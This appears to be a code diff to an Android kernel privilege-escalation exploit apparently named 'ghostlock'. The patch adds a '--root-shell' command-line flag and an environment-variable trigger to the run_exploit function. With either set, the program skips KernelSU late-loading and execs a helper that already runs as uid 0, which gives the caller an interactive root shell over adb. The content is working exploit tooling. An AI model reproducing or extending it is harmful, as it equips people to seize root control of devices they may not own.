@@ -875,6 +875,30 @@ static int run_local_late_load(void) {
   return 0;
 }
 
+/* The UMH daemon already owns uid 0 and exposes the authenticated shell
+ * service on temp_su.sock. Keep the console path independent from KernelSU:
+ * exec the existing helper client with no command so its daemon-side default
+ * is /system/bin/sh. This keeps adb's standard descriptors attached to the
+ * resulting root shell. */
+static int handoff_root_shell(void) {
+  const char *helper_path = local_root_helper_path();
+  pr_info("root shell handoff helper=%s\n", helper_path);
+  fflush(stdout);
+  fflush(stderr);
+  execl(helper_path, "ghostlock-helper", (char *)NULL);
+  int saved_errno = errno;
+  pr_warning("root shell helper exec failed errno=%d\n", saved_errno);
+  return 127;
+}
+
+static int root_shell_requested(int argc, char **argv) {
+  if (argc >= 2 && argv && strcmp(argv[1], "--root-shell") == 0) {
+    return 1;
+  }
+  const char *env = getenv("GHOSTLOCK_ROOT_SHELL");
+  return env && env[0] && strcmp(env, "0") != 0;
+}
+
 /* Find a task through perf sample records. */
 static uintptr_t perf_find_task(void) {
   struct perf_event_attr pe;
@@ -1218,8 +1242,6 @@ static int verify_leaf_dir_stage(void *context) {
 }
 
 int run_exploit(int argc, char **argv) {
-  (void)argc;
-  (void)argv;
   disable_rseq_for_thread();
   set_unbuffer();
   signal(SIGPIPE, SIG_IGN);
@@ -1306,15 +1328,23 @@ int run_exploit(int argc, char **argv) {
     }
     TIMER("UMH work queued");
 
-    /* The dedicated local helper stays resident after --umh and accepts the
-     * late-load request from the original shell UID over the local socket. */
+    /* The dedicated UMH daemon is already root and accepts both the shell
+     * client and the late-load request from the original shell UID over the
+     * local socket. Root shell is an explicit diagnostic mode; the normal
+     * path continues with the verified late-load sequence. */
     errno = 0;
     const char *helper_path = local_root_helper_path();
     int helper_access = access(helper_path, X_OK);
     int helper_access_errno = helper_access < 0 ? errno : 0;
-    pr_info("local late-load helper=%s access=%d errno=%d socket=%s\n",
+    pr_info("local helper=%s access=%d errno=%d socket=%s\n",
             helper_path, helper_access, helper_access_errno,
             LOCAL_ROOT_SOCKET);
+    if (root_shell_requested(argc, argv)) {
+      pr_info("root shell mode: skipping KernelSU late-load\n");
+      TIMER("root shell handoff");
+      return handoff_root_shell();
+    }
+
     int ksu_ready = run_local_late_load();
     if (ksu_ready) {
       pr_success("KernelSU ready via local UMH helper\n");
